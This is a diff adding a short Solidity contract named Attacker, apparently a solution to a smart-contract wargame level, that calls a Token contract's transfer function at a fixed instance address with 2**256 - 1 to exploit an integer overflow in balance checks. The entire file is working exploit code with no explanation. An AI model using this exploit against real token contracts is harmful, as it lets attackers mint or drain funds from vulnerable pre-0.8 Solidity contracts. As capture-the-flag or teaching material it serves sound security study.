@@ -1,0 +1,19 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "./Token.sol";
+
+contract Attacker {
+    Token token;
+
+    constructor() public {
+        //Instance address
+        token = Token(0x810331dF3C5054D79DD2EfC42bd7125287c3cB23);
+    }
+
+    function attack() public {
+        uint overflow = 2**256 - 1;
+        token.transfer(msg.sender, overflow);
+    }
+
+}
